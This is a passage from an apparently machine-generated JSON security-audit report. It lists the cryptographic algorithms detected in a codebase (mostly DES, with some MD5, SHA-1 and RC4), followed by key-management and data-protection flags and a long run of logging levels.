          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "rc4",
          "des",
          "md5",
          "sha1",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "rc4",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "sha1",
          "des",
          "md5",
          "sha1",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "md5",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "des",
          "md5",
          "des"
        ],
        "random_number_generation": true,
        "key_derivation": [
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found",
          "secure_kdf_found"
        ]
      },
      "key_management": {
        "key_rotation": true,
        "key_storage": "secure",
        "key_derivation": true,
        "hardware_security_modules": true
      },
      "pii_data_protection": {
        "data_classification": true,
        "anonymization": true,
        "masking": true,
        "retention_policies": true,
        "gdpr_compliance": true
      }
    },
    "monitoring_assessment": {
      "logging_security": {
        "structured_logging": true,
        "log_levels": [
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "WARNING",
          "ERROR",
          "ERROR",
          "WARNING",
          "DEBUG",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "CRITICAL",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "CRITICAL",
          "DEBUG",
          "CRITICAL",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "ERROR",
          "CRITICAL",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "WARNING",
          "WARNING",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "CRITICAL",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "ERROR",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "WARNING",
          "ERROR",
          "CRITICAL",
          "CRITICAL",
          "DEBUG",
          "ERROR",
          "DEBUG",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
          "INFO",
          "INFO",
          "DEBUG",
          "DEBUG",
          "INFO",
          "ERROR",
          "INFO",
          "DEBUG",
          "INFO",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "DEBUG",
          "WARNING",
          "WARNING",
          "DEBUG",
          "DEBUG",
          "INFO",
          "INFO",
